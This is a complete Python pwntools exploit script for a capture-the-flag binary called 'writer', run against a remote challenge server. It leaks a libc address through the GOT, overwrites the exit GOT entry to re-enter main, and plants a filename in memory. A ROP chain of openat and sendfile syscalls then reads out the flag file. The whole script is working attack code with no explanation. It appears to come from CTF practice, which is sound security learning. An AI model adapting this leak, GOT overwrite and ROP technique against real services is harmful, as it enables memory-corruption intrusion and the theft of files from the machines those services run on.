from pwn import *

context.arch = "amd64"
r = remote("litctf.live" ,31790)
#r = process("./writer")
e = ELF("./writer")
libc =  ELF("./libc-2.31.so")
r.sendlineafter('From where?\n' ,str(e.got.puts+1))
r.recvuntil(b"\nHere is what's there:\n")
leak = r.recvuntil("\n")
leak = leak[0:len(leak)-1]
leak = int(leak)
if(leak < 0):
    leak = leak + 1 + 0xffffffff
libc_leak = u64(b"\xa0" + p32(leak) + b"\x7f\x00\x00")
log.info(f"[LEAK] {hex(libc_leak)}")
libc_base = libc_leak - libc.sym.puts
log.info(f"[LEAK] {hex(libc_base)}")
r.sendlineafter('To where?\n' ,str(e.got.exit))
r.sendlineafter('\nWhat?\n' ,str(e.sym.main))
r.sendlineafter('\nWas this a good challenge?\n' ,b"NOPE")
#GADDGETS
#-------------------------------------------------------------
data = 0x004042f8
ret =  0x00401016
pop_rdi = libc_base + 0x0000000000026b72
pop_rsi = libc_base + 0x0000000000027529
pop_rax = libc_base + 0x000000000004a550
syscall = libc_base + 0x0000000000066229
xor_r10 = libc_base + 0x0000000000141ee0     # xor r10d, r10d; mov eax, r10d; ret;
pop_rcx = libc_base + 0x000000000009f822
mov_r10_rcx_syscall = libc_base +  0x0000000000115f74   #mov r10, rcx; mov eax, 0x28; syscall;
# ------------------------------------------------------------
r.sendlineafter('From where?\n' ,str(e.got.puts+1))
r.sendlineafter('To where?\n' ,str(data))
r.sendlineafter('\nWhat?\n' ,"1818636078")
r.sendlineafter('\nWas this a good challenge?\n' ,b"NOPE")
r.sendlineafter('From where?\n' ,str(e.got.puts+1))
r.sendlineafter('To where?\n' ,str(data + 4))
r.sendlineafter('\nWhat?\n' ,"1949198177")
r.sendlineafter('\nWas this a good challenge?\n' ,b"NOPE")
r.sendlineafter('From where?\n' ,str(e.got.puts+1))
r.sendlineafter('To where?\n' ,str(data + 8))
r.sendlineafter('\nWhat?\n' ,"29816")
r.sendlineafter('\nWas this a good challenge?\n' ,b"NOPE")
r.sendlineafter('From where?\n' ,str(e.got.puts+1))
r.sendlineafter('To where?\n' ,str(e.got.exit))
r.sendlineafter('\nWhat?\n' ,str(ret))
rop_chain = p64(xor_r10) +p64(pop_rax) + p64(257) + p64(pop_rdi) + p64(-100 + 1 + 0xffffffff) + p64(pop_rsi) + p64(data) + p64(syscall) + p64(pop_rcx) + p64(100) + p64(pop_rdi) + p64(1)+p64(pop_rsi) + p64(0x3) +  p64(mov_r10_rcx_syscall)
r.sendlineafter('\nWas this a good challenge?\n' ,rop_chain)
r.recvuntil(b"\x7f\n")
flag = r.recvuntil(b"}")
flag = str(flag)
flag = flag.replace("b'","")
flag = flag.replace("'","")
log.info(f"[FLAG] {flag}")
